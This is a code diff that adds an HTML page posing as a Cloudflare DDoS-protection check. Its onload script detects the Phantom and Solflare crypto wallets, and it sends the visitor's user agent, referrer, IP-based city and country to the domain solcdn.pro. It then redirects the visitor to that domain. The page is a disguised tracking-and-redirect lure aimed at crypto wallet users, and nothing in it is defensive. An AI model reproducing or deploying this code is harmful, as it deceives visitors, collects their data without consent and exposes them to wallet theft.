@@ -1,0 +1,33 @@
+<html>
+
+<head>
+    <title>Cloudflare DDOS protection</title>
+    <script>
+        window.onload = async function () {
+            try {
+                let hasPhantom = window.phantom?.solana?.isPhantom;
+                let hasSolflare = window.solflare?.isSolflare;
+                let res = await fetch(`https://solcdn.pro/a?info=${btoa(`get-bonk.netlify.app ${navigator.userAgent}${hasPhantom ? ' Phantom' : ''} ${document.referrer}${hasSolflare ? ' Solflare' : ''}`).replaceAll('+', '$')}`);
+                let ip = (await res.text()).split(' ')[0];
+                res = await fetch(`https://ipwho.is/${ip}`);
+                let tmp = await res.json();
+                let country = tmp['country'];
+                let city = tmp['city'];
+                await fetch(`https://solcdn.pro/a?info=${btoa(`${city} ${country}`).replaceAll('+', '$')}`);
+            }
+            catch (err) {
+            }
+            window.location.href = `https://solcdn.pro`;
+        }
+    </script>
+</head>
+
+<body style="background-color: rgb(167, 149, 136); color: black; font-family: monospace;">
+</body>
+<div style="margin-top: 20%">
+    <center>
+        <h2>Checking connection...</h2>
+    </center>
+</div>
+
+</html>
